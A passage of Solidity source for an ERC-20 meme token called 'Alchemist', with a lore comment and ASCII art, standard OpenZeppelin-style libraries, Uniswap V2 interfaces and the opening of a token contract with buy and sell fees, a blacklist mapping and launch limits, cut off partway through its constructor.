1 /**
2 
3 In a world plagued by darkness; one in which the soul is tainted by the foulness of a virus.
4 
5 The sickness seeps through the psyche, altering all into evil beings.
6 
7 A world thus becomes plagued by those who are not trustable and do not have any form of empathy.
8 
9 Is it safe to be in this environment? Will there be anyone protecting us? Will anyone fly over and turn this helplessness into hopefulness?
10 
11 Mysterious and spiteful, he lurks above the dark wretched sky observing the predators. He seeks restoration upon a world that used to once have brightness.
12 
13 THE ALCHEMIST
14 
15                                        '"^^^^┌┌"       ╙╣▓▓▓█▀▄╩▀╟▄█▀█║█╠╠╪╬▌▀╬▓████████████████████
16                                      '..^^^^^┌~          ╙▓▀▄█▓.▄██╫▓▓▒█▄╦╙╠╣███████████████████████
17                  ,▄▄Æ▓████████████▓▌▄▄;^^^^^^┌~           ║▓██░▓████╫█▌▒▓▌▒φ▒╬██████████████████████
18               ▄▓▓█▓██████████████████████▄┌^,┌:         ."▓█▌╓████████▐╫j▌▓╬▓╣██████████████████████
19              ╟████████████████████████████▒^┌┌┌:-       , ╙▀╓█████████▒░╠╩╕▐██████████▌▓▄╬▓█████████
20               ╨█████████▀▀▀▀▀▀▀▀▀███████▌ '" "┌┌⌐░░δ▒▒▒▓▓▓M]╨██████████▓╬╔▒╩╙▀╨╨▀▀▀▀╫██▌  ╫█████████
21                ╫╨└                    └╫      ^  ]░Σ╠╠╬╣▓▓ ╫███████████▀╨▒#⌐,. '┐»  └▀⌐   ▐█████████
22              ,,╫▄▄▄▄▄▌▌▓▓▓▓▓▓▓▓▓▓▓▌▌▄▄▄▓▄µ       ,░░▒╠╬╣▓▌.███████████Ö    ╟▌█▓┐ "   "w.  ╫█████████
23      ,▄▄▄▄▓█████▓████╙``j▒╩╨╠▒╙╩Γ╙╙╙╙╙╣███████▓▌▄▄▄▄▄Γ└║▓▒▐██████▀▀▀╙    ~'¬└└        .  └▐█████████
24     └╙╙╙╙╙╙╙╙╙╙╙▓███╙  ┌Å╥██████µ╕   ╬╟█▓▓▀▀▀▀╨╙╙└└   ╔╢╬▒]████▓╪,  ' ~      '           ▓██████████
25                 ╫███   ╣ ████████j  ^╫████b '      ."":»╙╙=║▓▓▓▓╬╬ ...`~.             '╓▀▓██████████
26                 "███   ╫╙███████▌╫    ╙▀█▌Γ'  '  '       ╓⌐╚▀▓█▓▄⌐ ,;;{≤ⁿ,          ' ╔▓▒╣██████████
27                  ╟██▄   ╨▄╠▀▀▀▀├m─        "w . '         =ε≈#╣▓▓▓▌▄▄░│└└┘╙╙          ;╬░║▓██████████
28                   ╨██▌     └└└└          "-,└v      '""░░░"]@╟╣▓▓▓██████▓▄  ` -  ' .²╠▒φ╫▓██████████
29                   ▓████▌,                   └%▄Ç,^.      ` φ╚╚)╫╣╣▓▓██████⌐        .,░░╠▓███████████
30                   ████████▄▄, ^w               ╙╧ƒ^-       ░∩^^┐╙╬╬╣▓▓███▌        .;»¡▒▓▓███████████
31                 ,µ▀██████████████▌▄▄▄▄▄≈≈g,       V:^-      "»  7"└╙╨╣▓▓▌' ╓α,    ]░]╠╬╢████████████
32              æ▐▄▓▓█▓▓▓████████████████▌▓▓▌▄┘Γ*w,    \:"^ .   '^    . "╝╝ ,╠ª"   ."¿>▐╣▐█████████████
33           ,é▓██████████▓▓███████████████████▓▄;  └╙\ ▐       .' . 'ⁿ,,~╓ó└      :░░▒╬░▓█████████████
34         ╓╬▓█████████████████████████████████████▌µ.  V▌      '. :  ^!²         ';]╠╩Ü╬███▓▓█████████
35       ▄████████████████████████████████████████████▓µ └      '~          ,   .,,∩ b.█╬╩└'  └"╙╨▓████
36     ▄████████████████████████████████████████████████   .     ''-      .░░¡  ¡┌¡\ \ ▓╦,        └▓███
37     ╙███████████████████████████████████████████████╩-'                  '    └     ╘└ `` └└╙""¬╙▀██
38 
39 */
40 
41 // Messsage to Anon
42 
43 // There are no official socials, but in our txns you will see our notes for the community
44 
45 // SPDX-License-Identifier: Unlicensed
46 
47 pragma solidity 0.8.9;
48  
49 abstract contract Context {
50     function _msgSender() internal view virtual returns (address) {
51         return msg.sender;
52     }
53  
54     function _msgData() internal view virtual returns (bytes calldata) {
55         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
56         return msg.data;
57     }
58 }
59  
60 interface IUniswapV2Pair {
61     event Approval(address indexed owner, address indexed spender, uint value);
62     event Transfer(address indexed from, address indexed to, uint value);
63  
64     function name() external pure returns (string memory);
65     function symbol() external pure returns (string memory);
66     function decimals() external pure returns (uint8);
67     function totalSupply() external view returns (uint);
68     function balanceOf(address owner) external view returns (uint);
69     function allowance(address owner, address spender) external view returns (uint);
70  
71     function approve(address spender, uint value) external returns (bool);
72     function transfer(address to, uint value) external returns (bool);
73     function transferFrom(address from, address to, uint value) external returns (bool);
74  
75     function DOMAIN_SEPARATOR() external view returns (bytes32);
76     function PERMIT_TYPEHASH() external pure returns (bytes32);
77     function nonces(address owner) external view returns (uint);
78  
79     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
80  
81     event Mint(address indexed sender, uint amount0, uint amount1);
82     event Swap(
83         address indexed sender,
84         uint amount0In,
85         uint amount1In,
86         uint amount0Out,
87         uint amount1Out,
88         address indexed to
89     );
90     event Sync(uint112 reserve0, uint112 reserve1);
91  
92     function MINIMUM_LIQUIDITY() external pure returns (uint);
93     function factory() external view returns (address);
94     function token0() external view returns (address);
95     function token1() external view returns (address);
96     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
97     function price0CumulativeLast() external view returns (uint);
98     function price1CumulativeLast() external view returns (uint);
99     function kLast() external view returns (uint);
100  
101     function mint(address to) external returns (uint liquidity);
102     function burn(address to) external returns (uint amount0, uint amount1);
103     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
104     function skim(address to) external;
105     function sync() external;
106  
107     function initialize(address, address) external;
108 }
109  
110 interface IUniswapV2Factory {
111     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
112  
113     function feeTo() external view returns (address);
114     function feeToSetter() external view returns (address);
115  
116     function getPair(address tokenA, address tokenB) external view returns (address pair);
117     function allPairs(uint) external view returns (address pair);
118     function allPairsLength() external view returns (uint);
119  
120     function createPair(address tokenA, address tokenB) external returns (address pair);
121  
122     function setFeeTo(address) external;
123     function setFeeToSetter(address) external;
124 }
125  
126 interface IERC20 {
127     /**
128      * @dev Returns the amount of tokens in existence.
129      */
130     function totalSupply() external view returns (uint256);
131  
132     /**
133      * @dev Returns the amount of tokens owned by `account`.
134      */
135     function balanceOf(address account) external view returns (uint256);
136  
137     /**
138      * @dev Moves `amount` tokens from the caller's account to `recipient`.
139      *
140      * Returns a boolean value indicating whether the operation succeeded.
141      *
142      * Emits a {Transfer} event.
143      */
144     function transfer(address recipient, uint256 amount) external returns (bool);
145  
146     /**
147      * @dev Returns the remaining number of tokens that `spender` will be
148      * allowed to spend on behalf of `owner` through {transferFrom}. This is
149      * zero by default.
150      *
151      * This value changes when {approve} or {transferFrom} are called.
152      */
153     function allowance(address owner, address spender) external view returns (uint256);
154  
155     /**
156      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
157      *
158      * Returns a boolean value indicating whether the operation succeeded.
159      *
160      * IMPORTANT: Beware that changing an allowance with this method brings the risk
161      * that someone may use both the old and the new allowance by unfortunate
162      * transaction ordering. One possible solution to mitigate this race
163      * condition is to first reduce the spender's allowance to 0 and set the
164      * desired value afterwards:
165      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
166      *
167      * Emits an {Approval} event.
168      */
169     function approve(address spender, uint256 amount) external returns (bool);
170  
171     /**
172      * @dev Moves `amount` tokens from `sender` to `recipient` using the
173      * allowance mechanism. `amount` is then deducted from the caller's
174      * allowance.
175      *
176      * Returns a boolean value indicating whether the operation succeeded.
177      *
178      * Emits a {Transfer} event.
179      */
180     function transferFrom(
181         address sender,
182         address recipient,
183         uint256 amount
184     ) external returns (bool);
185  
186     /**
187      * @dev Emitted when `value` tokens are moved from one account (`from`) to
188      * another (`to`).
189      *
190      * Note that `value` may be zero.
191      */
192     event Transfer(address indexed from, address indexed to, uint256 value);
193  
194     /**
195      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
196      * a call to {approve}. `value` is the new allowance.
197      */
198     event Approval(address indexed owner, address indexed spender, uint256 value);
199 }
200  
201 interface IERC20Metadata is IERC20 {
202     /**
203      * @dev Returns the name of the token.
204      */
205     function name() external view returns (string memory);
206  
207     /**
208      * @dev Returns the symbol of the token.
209      */
210     function symbol() external view returns (string memory);
211  
212     /**
213      * @dev Returns the decimals places of the token.
214      */
215     function decimals() external view returns (uint8);
216 }
217  
218  
219 contract ERC20 is Context, IERC20, IERC20Metadata {
220     using SafeMath for uint256;
221  
222     mapping(address => uint256) private _balances;
223  
224     mapping(address => mapping(address => uint256)) private _allowances;
225  
226     uint256 private _totalSupply;
227  
228     string private _name;
229     string private _symbol;
230  
231     /**
232      * @dev Sets the values for {name} and {symbol}.
233      *
234      * The default value of {decimals} is 18. To select a different value for
235      * {decimals} you should overload it.
236      *
237      * All two of these values are immutable: they can only be set once during
238      * construction.
239      */
240     constructor(string memory name_, string memory symbol_) {
241         _name = name_;
242         _symbol = symbol_;
243     }
244  
245     /**
246      * @dev Returns the name of the token.
247      */
248     function name() public view virtual override returns (string memory) {
249         return _name;
250     }
251  
252     /**
253      * @dev Returns the symbol of the token, usually a shorter version of the
254      * name.
255      */
256     function symbol() public view virtual override returns (string memory) {
257         return _symbol;
258     }
259  
260     /**
261      * @dev Returns the number of decimals used to get its user representation.
262      * For example, if `decimals` equals `2`, a balance of `505` tokens should
263      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
264      *
265      * Tokens usually opt for a value of 18, imitating the relationship between
266      * Ether and Wei. This is the value {ERC20} uses, unless this function is
267      * overridden;
268      *
269      * NOTE: This information is only used for _display_ purposes: it in
270      * no way affects any of the arithmetic of the contract, including
271      * {IERC20-balanceOf} and {IERC20-transfer}.
272      */
273     function decimals() public view virtual override returns (uint8) {
274         return 18;
275     }
276  
277     /**
278      * @dev See {IERC20-totalSupply}.
279      */
280     function totalSupply() public view virtual override returns (uint256) {
281         return _totalSupply;
282     }
283  
284     /**
285      * @dev See {IERC20-balanceOf}.
286      */
287     function balanceOf(address account) public view virtual override returns (uint256) {
288         return _balances[account];
289     }
290  
291     /**
292      * @dev See {IERC20-transfer}.
293      *
294      * Requirements:
295      *
296      * - `recipient` cannot be the zero address.
297      * - the caller must have a balance of at least `amount`.
298      */
299     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
300         _transfer(_msgSender(), recipient, amount);
301         return true;
302     }
303  
304     /**
305      * @dev See {IERC20-allowance}.
306      */
307     function allowance(address owner, address spender) public view virtual override returns (uint256) {
308         return _allowances[owner][spender];
309     }
310  
311     /**
312      * @dev See {IERC20-approve}.
313      *
314      * Requirements:
315      *
316      * - `spender` cannot be the zero address.
317      */
318     function approve(address spender, uint256 amount) public virtual override returns (bool) {
319         _approve(_msgSender(), spender, amount);
320         return true;
321     }
322  
323     /**
324      * @dev See {IERC20-transferFrom}.
325      *
326      * Emits an {Approval} event indicating the updated allowance. This is not
327      * required by the EIP. See the note at the beginning of {ERC20}.
328      *
329      * Requirements:
330      *
331      * - `sender` and `recipient` cannot be the zero address.
332      * - `sender` must have a balance of at least `amount`.
333      * - the caller must have allowance for ``sender``'s tokens of at least
334      * `amount`.
335      */
336     function transferFrom(
337         address sender,
338         address recipient,
339         uint256 amount
340     ) public virtual override returns (bool) {
341         _transfer(sender, recipient, amount);
342         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
343         return true;
344     }
345  
346     /**
347      * @dev Atomically increases the allowance granted to `spender` by the caller.
348      *
349      * This is an alternative to {approve} that can be used as a mitigation for
350      * problems described in {IERC20-approve}.
351      *
352      * Emits an {Approval} event indicating the updated allowance.
353      *
354      * Requirements:
355      *
356      * - `spender` cannot be the zero address.
357      */
358     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
359         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
360         return true;
361     }
362  
363     /**
364      * @dev Atomically decreases the allowance granted to `spender` by the caller.
365      *
366      * This is an alternative to {approve} that can be used as a mitigation for
367      * problems described in {IERC20-approve}.
368      *
369      * Emits an {Approval} event indicating the updated allowance.
370      *
371      * Requirements:
372      *
373      * - `spender` cannot be the zero address.
374      * - `spender` must have allowance for the caller of at least
375      * `subtractedValue`.
376      */
377     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
378         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
379         return true;
380     }
381  
382     /**
383      * @dev Moves tokens `amount` from `sender` to `recipient`.
384      *
385      * This is internal function is equivalent to {transfer}, and can be used to
386      * e.g. implement automatic token fees, slashing mechanisms, etc.
387      *
388      * Emits a {Transfer} event.
389      *
390      * Requirements:
391      *
392      * - `sender` cannot be the zero address.
393      * - `recipient` cannot be the zero address.
394      * - `sender` must have a balance of at least `amount`.
395      */
396     function _transfer(
397         address sender,
398         address recipient,
399         uint256 amount
400     ) internal virtual {
401         require(sender != address(0), "ERC20: transfer from the zero address");
402         require(recipient != address(0), "ERC20: transfer to the zero address");
403  
404         _beforeTokenTransfer(sender, recipient, amount);
405  
406         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
407         _balances[recipient] = _balances[recipient].add(amount);
408         emit Transfer(sender, recipient, amount);
409     }
410  
411     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
412      * the total supply.
413      *
414      * Emits a {Transfer} event with `from` set to the zero address.
415      *
416      * Requirements:
417      *
418      * - `account` cannot be the zero address.
419      */
420     function _mint(address account, uint256 amount) internal virtual {
421         require(account != address(0), "ERC20: mint to the zero address");
422  
423         _beforeTokenTransfer(address(0), account, amount);
424  
425         _totalSupply = _totalSupply.add(amount);
426         _balances[account] = _balances[account].add(amount);
427         emit Transfer(address(0), account, amount);
428     }
429  
430     /**
431      * @dev Destroys `amount` tokens from `account`, reducing the
432      * total supply.
433      *
434      * Emits a {Transfer} event with `to` set to the zero address.
435      *
436      * Requirements:
437      *
438      * - `account` cannot be the zero address.
439      * - `account` must have at least `amount` tokens.
440      */
441     function _burn(address account, uint256 amount) internal virtual {
442         require(account != address(0), "ERC20: burn from the zero address");
443  
444         _beforeTokenTransfer(account, address(0), amount);
445  
446         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
447         _totalSupply = _totalSupply.sub(amount);
448         emit Transfer(account, address(0), amount);
449     }
450  
451     /**
452      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
453      *
454      * This internal function is equivalent to `approve`, and can be used to
455      * e.g. set automatic allowances for certain subsystems, etc.
456      *
457      * Emits an {Approval} event.
458      *
459      * Requirements:
460      *
461      * - `owner` cannot be the zero address.
462      * - `spender` cannot be the zero address.
463      */
464     function _approve(
465         address owner,
466         address spender,
467         uint256 amount
468     ) internal virtual {
469         require(owner != address(0), "ERC20: approve from the zero address");
470         require(spender != address(0), "ERC20: approve to the zero address");
471  
472         _allowances[owner][spender] = amount;
473         emit Approval(owner, spender, amount);
474     }
475  
476     /**
477      * @dev Hook that is called before any transfer of tokens. This includes
478      * minting and burning.
479      *
480      * Calling conditions:
481      *
482      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
483      * will be to transferred to `to`.
484      * - when `from` is zero, `amount` tokens will be minted for `to`.
485      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
486      * - `from` and `to` are never both zero.
487      *
488      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
489      */
490     function _beforeTokenTransfer(
491         address from,
492         address to,
493         uint256 amount
494     ) internal virtual {}
495 }
496  
497 library SafeMath {
498     /**
499      * @dev Returns the addition of two unsigned integers, reverting on
500      * overflow.
501      *
502      * Counterpart to Solidity's `+` operator.
503      *
504      * Requirements:
505      *
506      * - Addition cannot overflow.
507      */
508     function add(uint256 a, uint256 b) internal pure returns (uint256) {
509         uint256 c = a + b;
510         require(c >= a, "SafeMath: addition overflow");
511  
512         return c;
513     }
514  
515     /**
516      * @dev Returns the subtraction of two unsigned integers, reverting on
517      * overflow (when the result is negative).
518      *
519      * Counterpart to Solidity's `-` operator.
520      *
521      * Requirements:
522      *
523      * - Subtraction cannot overflow.
524      */
525     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
526         return sub(a, b, "SafeMath: subtraction overflow");
527     }
528  
529     /**
530      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
531      * overflow (when the result is negative).
532      *
533      * Counterpart to Solidity's `-` operator.
534      *
535      * Requirements:
536      *
537      * - Subtraction cannot overflow.
538      */
539     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
540         require(b <= a, errorMessage);
541         uint256 c = a - b;
542  
543         return c;
544     }
545  
546     /**
547      * @dev Returns the multiplication of two unsigned integers, reverting on
548      * overflow.
549      *
550      * Counterpart to Solidity's `*` operator.
551      *
552      * Requirements:
553      *
554      * - Multiplication cannot overflow.
555      */
556     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
557         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
558         // benefit is lost if 'b' is also tested.
559         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
560         if (a == 0) {
561             return 0;
562         }
563  
564         uint256 c = a * b;
565         require(c / a == b, "SafeMath: multiplication overflow");
566  
567         return c;
568     }
569  
570     /**
571      * @dev Returns the integer division of two unsigned integers. Reverts on
572      * division by zero. The result is rounded towards zero.
573      *
574      * Counterpart to Solidity's `/` operator. Note: this function uses a
575      * `revert` opcode (which leaves remaining gas untouched) while Solidity
576      * uses an invalid opcode to revert (consuming all remaining gas).
577      *
578      * Requirements:
579      *
580      * - The divisor cannot be zero.
581      */
582     function div(uint256 a, uint256 b) internal pure returns (uint256) {
583         return div(a, b, "SafeMath: division by zero");
584     }
585  
586     /**
587      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
588      * division by zero. The result is rounded towards zero.
589      *
590      * Counterpart to Solidity's `/` operator. Note: this function uses a
591      * `revert` opcode (which leaves remaining gas untouched) while Solidity
592      * uses an invalid opcode to revert (consuming all remaining gas).
593      *
594      * Requirements:
595      *
596      * - The divisor cannot be zero.
597      */
598     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
599         require(b > 0, errorMessage);
600         uint256 c = a / b;
601         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
602  
603         return c;
604     }
605  
606     /**
607      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
608      * Reverts when dividing by zero.
609      *
610      * Counterpart to Solidity's `%` operator. This function uses a `revert`
611      * opcode (which leaves remaining gas untouched) while Solidity uses an
612      * invalid opcode to revert (consuming all remaining gas).
613      *
614      * Requirements:
615      *
616      * - The divisor cannot be zero.
617      */
618     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
619         return mod(a, b, "SafeMath: modulo by zero");
620     }
621  
622     /**
623      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
624      * Reverts with custom message when dividing by zero.
625      *
626      * Counterpart to Solidity's `%` operator. This function uses a `revert`
627      * opcode (which leaves remaining gas untouched) while Solidity uses an
628      * invalid opcode to revert (consuming all remaining gas).
629      *
630      * Requirements:
631      *
632      * - The divisor cannot be zero.
633      */
634     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
635         require(b != 0, errorMessage);
636         return a % b;
637     }
638 }
639  
640 contract Ownable is Context {
641     address private _owner;
642  
643     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
644  
645     /**
646      * @dev Initializes the contract setting the deployer as the initial owner.
647      */
648     constructor () {
649         address msgSender = _msgSender();
650         _owner = msgSender;
651         emit OwnershipTransferred(address(0), msgSender);
652     }
653  
654     /**
655      * @dev Returns the address of the current owner.
656      */
657     function owner() public view returns (address) {
658         return _owner;
659     }
660  
661     /**
662      * @dev Throws if called by any account other than the owner.
663      */
664     modifier onlyOwner() {
665         require(_owner == _msgSender(), "Ownable: caller is not the owner");
666         _;
667     }
668  
669     /**
670      * @dev Leaves the contract without owner. It will not be possible to call
671      * `onlyOwner` functions anymore. Can only be called by the current owner.
672      *
673      * NOTE: Renouncing ownership will leave the contract without an owner,
674      * thereby removing any functionality that is only available to the owner.
675      */
676     function renounceOwnership() public virtual onlyOwner {
677         emit OwnershipTransferred(_owner, address(0));
678         _owner = address(0);
679     }
680  
681     /**
682      * @dev Transfers ownership of the contract to a new account (`newOwner`).
683      * Can only be called by the current owner.
684      */
685     function transferOwnership(address newOwner) public virtual onlyOwner {
686         require(newOwner != address(0), "Ownable: new owner is the zero address");
687         emit OwnershipTransferred(_owner, newOwner);
688         _owner = newOwner;
689     }
690 }
691  
692  
693  
694 library SafeMathInt {
695     int256 private constant MIN_INT256 = int256(1) << 255;
696     int256 private constant MAX_INT256 = ~(int256(1) << 255);
697  
698     /**
699      * @dev Multiplies two int256 variables and fails on overflow.
700      */
701     function mul(int256 a, int256 b) internal pure returns (int256) {
702         int256 c = a * b;
703  
704         // Detect overflow when multiplying MIN_INT256 with -1
705         require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
706         require((b == 0) || (c / b == a));
707         return c;
708     }
709  
710     /**
711      * @dev Division of two int256 variables and fails on overflow.
712      */
713     function div(int256 a, int256 b) internal pure returns (int256) {
714         // Prevent overflow when dividing MIN_INT256 by -1
715         require(b != -1 || a != MIN_INT256);
716  
717         // Solidity already throws when dividing by 0.
718         return a / b;
719     }
720  
721     /**
722      * @dev Subtracts two int256 variables and fails on overflow.
723      */
724     function sub(int256 a, int256 b) internal pure returns (int256) {
725         int256 c = a - b;
726         require((b >= 0 && c <= a) || (b < 0 && c > a));
727         return c;
728     }
729  
730     /**
731      * @dev Adds two int256 variables and fails on overflow.
732      */
733     function add(int256 a, int256 b) internal pure returns (int256) {
734         int256 c = a + b;
735         require((b >= 0 && c >= a) || (b < 0 && c < a));
736         return c;
737     }
738  
739     /**
740      * @dev Converts to absolute value, and fails on overflow.
741      */
742     function abs(int256 a) internal pure returns (int256) {
743         require(a != MIN_INT256);
744         return a < 0 ? -a : a;
745     }
746  
747  
748     function toUint256Safe(int256 a) internal pure returns (uint256) {
749         require(a >= 0);
750         return uint256(a);
751     }
752 }
753  
754 library SafeMathUint {
755   function toInt256Safe(uint256 a) internal pure returns (int256) {
756     int256 b = int256(a);
757     require(b >= 0);
758     return b;
759   }
760 }
761  
762  
763 interface IUniswapV2Router01 {
764     function factory() external pure returns (address);
765     function WETH() external pure returns (address);
766  
767     function addLiquidity(
768         address tokenA,
769         address tokenB,
770         uint amountADesired,
771         uint amountBDesired,
772         uint amountAMin,
773         uint amountBMin,
774         address to,
775         uint deadline
776     ) external returns (uint amountA, uint amountB, uint liquidity);
777     function addLiquidityETH(
778         address token,
779         uint amountTokenDesired,
780         uint amountTokenMin,
781         uint amountETHMin,
782         address to,
783         uint deadline
784     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
785     function removeLiquidity(
786         address tokenA,
787         address tokenB,
788         uint liquidity,
789         uint amountAMin,
790         uint amountBMin,
791         address to,
792         uint deadline
793     ) external returns (uint amountA, uint amountB);
794     function removeLiquidityETH(
795         address token,
796         uint liquidity,
797         uint amountTokenMin,
798         uint amountETHMin,
799         address to,
800         uint deadline
801     ) external returns (uint amountToken, uint amountETH);
802     function removeLiquidityWithPermit(
803         address tokenA,
804         address tokenB,
805         uint liquidity,
806         uint amountAMin,
807         uint amountBMin,
808         address to,
809         uint deadline,
810         bool approveMax, uint8 v, bytes32 r, bytes32 s
811     ) external returns (uint amountA, uint amountB);
812     function removeLiquidityETHWithPermit(
813         address token,
814         uint liquidity,
815         uint amountTokenMin,
816         uint amountETHMin,
817         address to,
818         uint deadline,
819         bool approveMax, uint8 v, bytes32 r, bytes32 s
820     ) external returns (uint amountToken, uint amountETH);
821     function swapExactTokensForTokens(
822         uint amountIn,
823         uint amountOutMin,
824         address[] calldata path,
825         address to,
826         uint deadline
827     ) external returns (uint[] memory amounts);
828     function swapTokensForExactTokens(
829         uint amountOut,
830         uint amountInMax,
831         address[] calldata path,
832         address to,
833         uint deadline
834     ) external returns (uint[] memory amounts);
835     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
836         external
837         payable
838         returns (uint[] memory amounts);
839     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
840         external
841         returns (uint[] memory amounts);
842     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
843         external
844         returns (uint[] memory amounts);
845     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
846         external
847         payable
848         returns (uint[] memory amounts);
849  
850     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
851     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
852     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
853     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
854     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
855 }
856  
857 interface IUniswapV2Router02 is IUniswapV2Router01 {
858     function removeLiquidityETHSupportingFeeOnTransferTokens(
859         address token,
860         uint liquidity,
861         uint amountTokenMin,
862         uint amountETHMin,
863         address to,
864         uint deadline
865     ) external returns (uint amountETH);
866     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
867         address token,
868         uint liquidity,
869         uint amountTokenMin,
870         uint amountETHMin,
871         address to,
872         uint deadline,
873         bool approveMax, uint8 v, bytes32 r, bytes32 s
874     ) external returns (uint amountETH);
875  
876     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
877         uint amountIn,
878         uint amountOutMin,
879         address[] calldata path,
880         address to,
881         uint deadline
882     ) external;
883     function swapExactETHForTokensSupportingFeeOnTransferTokens(
884         uint amountOutMin,
885         address[] calldata path,
886         address to,
887         uint deadline
888     ) external payable;
889     function swapExactTokensForETHSupportingFeeOnTransferTokens(
890         uint amountIn,
891         uint amountOutMin,
892         address[] calldata path,
893         address to,
894         uint deadline
895     ) external;
896 }
897  
898 contract Alchemist is ERC20, Ownable {
899     using SafeMath for uint256;
900  
901     IUniswapV2Router02 public immutable uniswapV2Router;
902     address public immutable uniswapV2Pair;
903  
904     bool private swapping;
905  
906     address private marketingWallet;
907     address private devWallet;
908  
909     uint256 public maxTransactionAmount;
910     uint256 public swapTokensAtAmount;
911     uint256 public maxWallet;
912  
913     bool public limitsInEffect = true;
914     bool public tradingActive = false;
915     bool public swapEnabled = false;
916     bool public enableEarlySellTax = true;
917  
918      // Anti-bot and anti-whale mappings and variables
919     mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch
920  
921     // Seller Map
922     mapping (address => uint256) private _holderFirstBuyTimestamp;
923  
924     // Blacklist Map
925     mapping (address => bool) private _blacklist;
926     bool public transferDelayEnabled = true;
927  
928     uint256 public buyTotalFees;
929     uint256 public buyMarketingFee;
930     uint256 public buyLiquidityFee;
931     uint256 public buyDevFee;
932  
933     uint256 public sellTotalFees;
934     uint256 public sellMarketingFee;
935     uint256 public sellLiquidityFee;
936     uint256 public sellDevFee;
937  
938     uint256 public earlySellLiquidityFee;
939     uint256 public earlySellMarketingFee;
940     uint256 public earlySellDevFee;
941  
942     uint256 public tokensForMarketing;
943     uint256 public tokensForLiquidity;
944     uint256 public tokensForDev;
945  
946     // block number of opened trading
947     uint256 launchedAt;
948  
949     /******************/
950  
951     // exclude from fees and max transaction amount
952     mapping (address => bool) private _isExcludedFromFees;
953     mapping (address => bool) public _isExcludedMaxTransactionAmount;
954  
955     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
956     // could be subject to a maximum transfer amount
957     mapping (address => bool) public automatedMarketMakerPairs;
958  
959     event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
960  
961     event ExcludeFromFees(address indexed account, bool isExcluded);
962  
963     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
964  
965     event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet);
966  
967     event devWalletUpdated(address indexed newWallet, address indexed oldWallet);
968  
969     event SwapAndLiquify(
970         uint256 tokensSwapped,
971         uint256 ethReceived,
972         uint256 tokensIntoLiquidity
973     );
974  
975     event AutoNukeLP();
976  
977     event ManualNukeLP();
978  
979     constructor() ERC20("Alchemist", "Alchemist") {
980  
981         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
982  
983         excludeFromMaxTransaction(address(_uniswapV2Router), true);
984         uniswapV2Router = _uniswapV2Router;
985  
986         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
987         excludeFromMaxTransaction(address(uniswapV2Pair), true);
988         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
989  
990         uint256 _buyMarketingFee = 3;
991         uint256 _buyLiquidityFee = 0;
992         uint256 _buyDevFee = 2;
993  
994         uint256 _sellMarketingFee = 2;
995         uint256 _sellLiquidityFee = 1;
996         uint256 _sellDevFee = 2;
997  
998         uint256 _earlySellLiquidityFee = 1;
999         uint256 _earlySellMarketingFee = 3;
1000 	    uint256 _earlySellDevFee = 3
1001  
1002     ; uint256 totalSupply = 1 * 1e12 * 1e18;
1003  
